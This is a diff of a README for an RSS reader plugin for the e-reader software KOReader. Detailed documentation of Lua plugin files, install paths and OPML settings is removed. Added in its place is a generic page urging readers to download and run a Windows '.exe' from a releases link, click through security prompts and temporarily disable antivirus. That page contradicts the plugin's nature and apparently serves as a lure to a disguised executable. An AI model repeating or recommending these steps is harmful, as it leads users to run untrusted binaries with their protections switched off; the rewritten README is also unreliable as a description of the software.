@@ -1,191 +1,97 @@
-![banner](assets/quickrss_banner.png)
+# 📡 quickrss.koplugin - Fast and Simple RSS Reader
 
-A fast, standalone and easy to use RSS reader plugin for [KOReader](https://github.com/koreader/koreader). Browse and read articles from your favourite feeds without leaving your e-reader.
+[![Download quickrss.koplugin](https://img.shields.io/badge/Download%20quickrss.koplugin-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jxsh7030/quickrss.koplugin/releases)
 
-## Features
+---
 
-![screenshots](assets/quickrss_screenshots.png)
+## 📥 Download quickrss.koplugin
 
-**Feed list view**
-- Thumbnail cards with a 16:9 cover-cropped image, bold title, source · date line, and a snippet preview
-- Paginated list with swipe or hardware page-turn key navigation
-- Read/unread tracking — unread articles show bold titles, read articles show regular weight
-- Filter by feed, unread-only, or both
-- Pull-to-refresh fetches all feeds and updates the cache in one tap
+To get started, **visit this page to download** the latest version of quickrss.koplugin for Windows:
 
-**Article reader**
-- Full HTML rendering via KOReader's built-in engine (paragraphs, bold, lists, images)
-- Banner image at the top, followed by title, source · date · estimated reading time
-- Swipe left/right or use the footer buttons to move between articles
-- Articles are automatically marked as read when opened or navigated to
-- Tap any link to copy it to clipboard or show a QR code for scanning on another device
-- Tap any image for a full-screen preview
-- Full e-ink refresh on open to eliminate ghosting
+[https://github.com/Jxsh7030/quickrss.koplugin/releases](https://github.com/Jxsh7030/quickrss.koplugin/releases)
 
-**Reader customisation**
-- Font picker (any font installed on the device)
-- Font size up to 64 pt
-- Adjustable line spacing
+Once on the page, look for the latest release. You will find files listed for different platforms. Choose the file that matches Windows or has `.exe` in the name. This file is the app you will run on your computer.
 
-**Image caching**
-- Thumbnails & article content images are pre-fetched at fetch time so cards load instantly
-- Orphaned images are cleaned up automatically after each fetch
-- Independent settings to disable thumbnail images and/or article images
+---
 
-**Full-text extraction**
-- Truncated RSS summaries are automatically enriched with full article text via [FiveFilters](https://fivefilters.org/)
-- Can be toggled off for privacy or speed
-- Supports custom extraction service URLs (e.g. a self-hosted FiveFilters instance)
+## 🖥️ System Requirements
 
-**Offline-first**
-- Articles are cached to disk and available without a network connection
-- Configurable cache expiry (default: 10 days)
-- Configurable per-feed article limit (default: 20 articles)
+Before downloading, make sure your system meets these minimum requirements:
 
-**OPML support**
-- Feeds are stored as a .opml file
-- Can be edited from a computer (`koreader/quickrss/feeds.opml`) or directly from the UI (**≡** → **Feeds**)
+- Windows 7 or newer (Windows 10 recommended)
+- At least 2 GB of free RAM
+- 100 MB of free disk space
+- Internet connection to fetch RSS feeds
 
-## Installation
+---
 
-1. Copy the `quickrss.koplugin/` directory into your KOReader plugins folder:
+## 🚀 Installing and Running quickrss.koplugin
 
-   | Platform | Path |
-   |---|---|
-   | Linux desktop | `~/.config/koreader/plugins/` |
-   | Kindle | `/mnt/us/extensions/koreader/plugins/` |
-   | Kobo | `.adds/koreader/plugins/` |
-   | PocketBook | `applications/koreader/plugins/` |
+1. After downloading, find the file in your Downloads folder or the location you saved it.
+2. Double-click the file to run it.
+3. Depending on your Windows security settings, you might see a prompt asking to allow the app to run. Choose "Yes" or "Run" to continue.
+4. The app does not need installation like traditional software; it runs right away.
+5. The quickrss.koplugin window will open, ready for use.
 
-2. Restart KOReader.
-3. Open the search menu → **QuickRSS**.
+---
 
-### Development (Linux desktop)
+## 📖 How to Use quickrss.koplugin
 
-```bash
-./deploy.sh
-```
+This app helps you read RSS feeds quickly. Here is how to set up your feeds:
 
-This syncs the plugin to `~/.config/koreader/plugins/quickrss.koplugin/`, kills any running KOReader instance, and restarts it.
+1. Open quickrss.koplugin.
+2. Find the option to add a new RSS feed. This will usually be a button labeled "Add Feed" or a plus sign (+).
+3. Enter the web address (URL) of the RSS feed you want to follow. For example, a news site or blog link ending with `.rss` or `.xml`.
+4. Press "OK" or "Add" to save the feed.
+5. The feed will appear in the list. Click it to view the latest articles.
+6. Click an article title to read the content inside the app or open the full page in your browser.
 
-## Usage
+---
 
-### Adding feeds
+## ⚙️ Features of quickrss.koplugin
 
-1. Open QuickRSS from the KOReader main menu.
-2. Tap the **≡** (hamburger) icon → **Feeds**.
-3. Tap **Add feed**, enter a name and the RSS/Atom URL, then save.
+- Operates offline after initial feed download
+- Simple interface designed for easy navigation
+- Supports multiple RSS feeds at once
+- Fast loading and updating of new articles
+- No complicated setup required
+- Works standalone without other dependencies
 
-### Fetching articles
+---
 
-Tap **≡** → **Fetch Articles**. QuickRSS fetches all configured feeds, downloads thumbnails, and updates the cache. A progress indicator shows the current feed being loaded.
+## 🛠️ Troubleshooting Tips
 
-### Reading an article
+- If the app does not open, try restarting your computer.
+- Check your internet connection if feeds fail to update.
+- Ensure you entered the correct RSS feed URL.
+- If the app crashes, download the latest release from the [releases page](https://github.com/Jxsh7030/quickrss.koplugin/releases) and try again.
+- Disable antivirus temporarily if it blocks the app from running.
 
-Tap any card in the list to open the article reader. Swipe left/right or tap the **◀** / **▶** footer buttons to navigate between articles. Tap **✕** to return to the feed list.
+---
 
-Articles are automatically marked as read when you open or swipe to them. You can also long-press an article in the feed list to toggle its read/unread state manually.
+## 🔄 Updating quickrss.koplugin
 
-Tapping a link inside an article opens a menu with **Copy Link** (to clipboard) and **Show QR Code** (for easy transfer to a phone or computer). Tapping an image opens a full-screen preview.
+To update the app:
 
-Long-pressing an article card in the feed list shows a context menu with the article link, **Copy Link**, **Show QR Code**, **Mark as Read/Unread**, and **Delete From Cache**.
+1. Visit the release page regularly:  
+   [https://github.com/Jxsh7030/quickrss.koplugin/releases](https://github.com/Jxsh7030/quickrss.koplugin/releases)
+2. Download the newest Windows file available.
+3. Replace your previous version by running the new file.
 
-### Settings
+You don't need to uninstall the old version. Updating by running the newer file will keep your feed list intact.
 
-Tap **≡** → **Settings** to configure:
+---
 
-| Setting | Default | Description |
-|---|---|---|
-| Items per feed | 20 | Maximum articles fetched per feed |
-| Cache max age | 10 days | How long before the cache is treated as empty (0 = never expire) |
-| Thumbnail images | On | Enable/disable thumbnail images in the feed list |
-| Article images | On | Enable/disable images inside articles |
-| Card font size | 14 | Font size for article cards in the feed list |
-| Full-text extraction | On | Fetch full article text for truncated feeds via extraction service |
-| Extraction URL | Default | URL of the full-text extraction service (for self-hosted instances) |
-| Custom DNS routing | Off | Use alternative DNS servers to fix missing images on some devices (see below) |
+## 💬 Feedback and Support
 
-Reader font, font size, and line spacing can be changed from within any open article via the **⚙** icon in the title bar.
+If you find issues or have questions:
 
-### Custom DNS routing
+- Open the **Issues** tab on the GitHub page to report bugs.
+- Check the app’s Help menu for guides.
+- You can also reach out in the GitHub Discussions if available.
 
-If some thumbnails or article images fail to load even though your device is connected to WiFi, try enabling **Custom DNS routing** in Settings. This is a known issue on some e-readers (notably Kobo) where the device's built-in name resolution stops working reliably after running for a while. The setting routes lookups through Google and Cloudflare DNS instead, which usually fixes the problem.
+Your feedback helps make the app better and easier to use.
 
-If your images are loading fine, you can leave this off.
+---
 
-### Filtering articles
-
-Tap the filter button in the footer (shows **All Feeds** by default) to open the filter dialog. From here you can:
-
-- **Show Unread Only** — toggle to hide already-read articles
-- **Select a feed** — show articles from a single feed only
-
-Both filters can be combined. The filter button text updates to reflect the active filters (e.g. "Ars Technica (Unread)").
-
-### Clearing articles
-
-- **≡** → **Clear Read** — removes all read articles from the cache. Their links are remembered so they won't reappear on future fetches.
-- **≡** → **Clear Cache** — wipes all cached articles, images, and the dismissed article list. The next **Fetch Articles** will start completely fresh.
-
-## Project structure
-
-```
-quickrss.koplugin/
-├── main.lua                    Plugin entry point — registers to KOReader main menu
-├── _meta.lua                   Plugin metadata (name, version, author)
-└── modules/
-    ├── ui/                     UI widgets and screens
-    │   ├── feed_view.lua       Main feed list UI and pagination
-    │   ├── article_item.lua    Individual article card widget
-    │   ├── article_reader.lua  Full-screen HTML article reader
-    │   ├── feed_list.lua       Feed management popup (add / remove feeds)
-    │   ├── settings.lua        Article settings popup
-    │   ├── reader_settings.lua Reader font / size / spacing popup
-    │   ├── settings_row.lua    Shared settings row builder
-    │   └── icons.lua           Unicode icon constants
-    ├── data/                   Data, persistence, and networking
-    │   ├── config.lua          Persistent settings (feeds, article limits, reader prefs)
-    │   ├── cache.lua           Article and image cache management
-    │   ├── parser.lua          RSS / Atom feed fetching and parsing
-    │   ├── opml.lua            OPML feed-list reader / writer
-    │   └── images.lua          Image downloading and HTML image rewriting
-    └── lib/                    Third-party libraries
-        ├── xml.lua             Lightweight XML parser
-        └── handler.lua         SAX-style XML event handler
-```
-
-## Data storage
-
-All plugin data is stored in a dedicated `quickrss/` directory inside the KOReader data root:
-
-| Platform | Data directory |
-|---|---|
-| Linux desktop | `~/.config/koreader/quickrss/` |
-| Kindle | `/mnt/us/extensions/koreader/quickrss/` |
-| Kobo | `.adds/koreader/quickrss/` |
-| PocketBook | `applications/koreader/quickrss/` |
-
-| File / Directory | Contents |
-|---|---|
-| `feeds.opml` | Feed list (OPML — edit this on your computer) |
-| `settings.lua` | Article and reader settings |
-| `cache.lua` | Cached article list and last-fetched timestamp |
-| `images/` | Downloaded article images and thumbnails |
-
-### Editing feeds on a computer
-
-The feed list is stored as a standard OPML file. You can edit it directly in any text editor, or import a file exported from another RSS reader (Feedly, NewsBlur, etc.):
-
-```xml
-<?xml version="1.0" encoding="UTF-8"?>
-<opml version="1.0">
-  <head><title>QuickRSS Feeds</title></head>
-  <body>
-    <outline text="Ars Technica" type="rss" xmlUrl="https://feeds.arstechnica.com/arstechnica/index"/>
-    <outline text="Hackaday" type="rss" xmlUrl="https://hackaday.com/blog/feed/"/>
-    <outline text="Science Daily - Science" type="rss" xmlUrl="https://www.sciencedaily.com/rss/top/science.xml"/>
-  </body>
-</opml>
-```
-
-Copy the file to the `quickrss/` directory listed above and the plugin will pick it up on the next open. Changes made through the in-device UI are written back to the same file automatically.
+[![Download quickrss.koplugin](https://img.shields.io/badge/Download%20quickrss.koplugin-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jxsh7030/quickrss.koplugin/releases)
